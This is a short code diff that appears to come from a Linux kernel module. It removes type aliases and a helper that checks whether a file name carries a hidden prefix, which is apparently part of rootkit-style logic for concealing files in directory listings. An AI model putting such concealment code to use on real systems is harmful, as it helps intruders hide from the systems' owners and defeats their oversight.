@@ -28,12 +28,6 @@ typedef struct linux_dirent {
 
 typedef struct linux_dirent64 dirent64_t;
 
-typedef struct file file_t;
-typedef struct path path_t;
-typedef struct inode inode_t;
-typedef struct dentry dentry_t;
-typedef struct files_struct files_t;
-
 /**
  * Is the given path structure the root of a filesystem?
  *
@@ -303,18 +297,6 @@ static inline bool is_process_file(const file_t *const p_file, const char **cons
     }
 
     return is_process_path(&p_file->f_path, ps_name, p_pid);
-}
-
-/**
- * Does the given file name need to be hidden?
- *
- * @param s_filename The file name to check
- * @return `true` if the given file needs to be hidden, `false` otherwise
- */
-static inline bool is_filename_hidden(const char *const s_filename)
-{
-    // Check the name starts with the hidden prefix
-    return strncmp(s_filename, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN) == 0;
 }
 
 /**
